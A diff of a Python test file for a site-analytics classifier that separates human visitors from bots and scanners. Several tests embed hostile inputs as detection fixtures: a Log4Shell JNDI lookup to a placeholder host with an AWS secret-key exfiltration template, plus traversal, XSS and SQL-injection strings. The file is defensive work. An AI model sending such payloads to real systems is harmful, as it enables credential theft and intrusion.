@@ -43,10 +43,54 @@ def test_a_scanner_that_only_gets_404s_is_not_a_visitor():
     assert object_visitors.classify(rows) == {"10.0.0.1": object_visitors.BOT}
 
 
-def test_an_address_that_loaded_a_real_page_is_a_visitor():
+def test_a_real_page_plus_a_signal_is_a_visitor():
+    """One 200 is necessary but not sufficient -- see the test below."""
     rows = [view("10.0.0.2", "/nope", status=404),
-            view("10.0.0.2", "/shop", status=200)]
+            view("10.0.0.2", "/shop", status=200, referrer="https://news.example")]
     assert object_visitors.classify(rows) == {"10.0.0.2": object_visitors.VISITOR}
+
+
+def test_a_lone_hit_on_the_front_page_is_not_a_person():
+    """`/` returns 200 to everyone, so a successful load there proves
+    nothing. The first version of this counted every prober that touched
+    the homepage as a visitor, which was a large slice of a real week's
+    'direct traffic'."""
+    rows = [view("10.0.0.7", "/", status=200)]
+    assert object_visitors.classify(rows) == {"10.0.0.7": object_visitors.BOT}
+
+
+def test_a_second_page_is_enough_on_its_own():
+    """Nobody arrives at a second page by accident."""
+    rows = [view("10.0.0.8", "/"), view("10.0.0.8", "/shop")]
+    assert object_visitors.classify(rows) == {"10.0.0.8": object_visitors.VISITOR}
+
+
+def test_a_session_cookie_is_enough_on_its_own():
+    rows = [dict(view("10.0.0.9", "/"), session_id="abc123")]
+    assert object_visitors.classify(rows) == {"10.0.0.9": object_visitors.VISITOR}
+
+
+def test_an_attack_payload_in_a_header_is_never_a_visitor():
+    """A real one arrived as a Log4Shell probe with an AWS-credential
+    exfiltration template in the Referer, and was counted as a visitor
+    because it had also loaded the front page. It is inert here -- that is
+    a Java vulnerability probing a Python process -- but it is not a
+    person."""
+    payload = ("${jndi:ldap://b6c44635.canary.invalid/x}"
+               "AWS_SECRET_ACCESS_KEY=${env:AWS_SECRET_ACCESS_KEY:-}")
+    rows = [view("10.0.0.10", "/", referrer=payload),
+            view("10.0.0.10", "/shop", referrer=payload)]
+    assert object_visitors.classify(rows) == {"10.0.0.10": object_visitors.BOT}
+    assert object_visitors.hostile(payload)
+    assert not object_visitors.hostile("https://news.example/thread")
+
+
+def test_a_traversal_or_injection_attempt_is_a_bot():
+    for payload in ("/etc/passwd", "../../secret", "<script>alert(1)</script>",
+                    "' or '1'='1"):
+        rows = [view("10.0.0.11", "/", referrer=payload),
+                view("10.0.0.11", "/shop", referrer=payload)]
+        assert object_visitors.classify(rows)["10.0.0.11"] == object_visitors.BOT
 
 
 def test_an_honest_crawler_stays_a_bot_even_when_it_finds_a_page():
@@ -76,7 +120,7 @@ def test_an_api_only_client_is_not_a_visitor():
 
 def test_the_three_kinds_are_counted_apart():
     rows = [view("1.1.1.1", "/shop"), view("1.1.1.1", "/shop/p1"),
-            view("2.2.2.2", "/"),
+            view("2.2.2.2", "/", referrer="https://news.example"),
             view("9.9.9.9", "/wp-login.php", status=404),
             view("8.8.8.8", "/xmlrpc.php", status=404),
             view("3.3.3.3", "/orders", owner="true")]
@@ -89,8 +133,8 @@ def test_the_three_kinds_are_counted_apart():
 
 
 def test_a_returning_visitor_is_one_visitor():
-    rows = [view("1.1.1.1", "/shop", at=f"2026-07-26T{h:02d}:00:00Z")
-            for h in (9, 10, 11)]
+    rows = [view("1.1.1.1", "/shop", at=f"2026-07-26T{h:02d}:00:00Z",
+                 referrer="https://news.example") for h in (9, 10, 11)]
     summary = object_visitors.summarize(rows, days=7)
     assert summary["totals"]["visitor"]["unique"] == 1
     assert summary["totals"]["visitor"]["views"] == 3
@@ -100,9 +144,10 @@ def test_today_is_broken_down_by_hour():
     import datetime
 
     now = datetime.datetime(2026, 7, 26, 23, 0, tzinfo=datetime.timezone.utc)
-    rows = [view("1.1.1.1", "/shop", at="2026-07-26T09:30:00Z"),
-            view("2.2.2.2", "/shop", at="2026-07-26T09:45:00Z"),
-            view("3.3.3.3", "/shop", at="2026-07-26T14:05:00Z")]
+    ref = "https://news.example"
+    rows = [view("1.1.1.1", "/shop", at="2026-07-26T09:30:00Z", referrer=ref),
+            view("2.2.2.2", "/shop", at="2026-07-26T09:45:00Z", referrer=ref),
+            view("3.3.3.3", "/shop", at="2026-07-26T14:05:00Z", referrer=ref)]
     summary = object_visitors.summarize(rows, now=now, days=7)
 
     hours = {row["bucket"][-2:]: row["visitors"] for row in summary["hours"]}
@@ -115,7 +160,8 @@ def test_the_window_is_a_full_run_of_days_including_empty_ones():
     import datetime
 
     now = datetime.datetime(2026, 7, 26, 12, 0, tzinfo=datetime.timezone.utc)
-    rows = [view("1.1.1.1", "/shop", at="2026-07-24T09:00:00Z")]
+    rows = [view("1.1.1.1", "/shop", at="2026-07-24T09:00:00Z",
+                 referrer="https://news.example")]
     summary = object_visitors.summarize(rows, now=now, days=7)
 
     assert [row["bucket"] for row in summary["days"]] == [
@@ -136,7 +182,7 @@ def test_referrers_answer_where_did_they_come_from():
     """The actual point of the page on the day you tell somebody about it."""
     rows = [view("1.1.1.1", "/shop", referrer="https://news.example/thread"),
             view("2.2.2.2", "/shop", referrer="https://news.example/thread"),
-            view("3.3.3.3", "/shop")]
+            view("3.3.3.3", "/shop"), view("3.3.3.3", "/orders")]
     summary = object_visitors.summarize(rows, days=7)
 
     top = summary["referrers"][0]
@@ -152,8 +198,10 @@ def test_bot_referrers_never_pollute_the_list():
 
 
 def test_landing_pages_are_what_visitors_actually_opened():
-    rows = [view("1.1.1.1", "/shop"), view("2.2.2.2", "/shop"),
-            view("1.1.1.1", "/collections/notes/records")]
+    ref = "https://news.example"
+    rows = [view("1.1.1.1", "/shop", referrer=ref),
+            view("2.2.2.2", "/shop", referrer=ref),
+            view("1.1.1.1", "/collections/notes/records", referrer=ref)]
     summary = object_visitors.summarize(rows, days=7)
     assert summary["landing"][0] == {"path": "/shop", "visitors": 2}
 
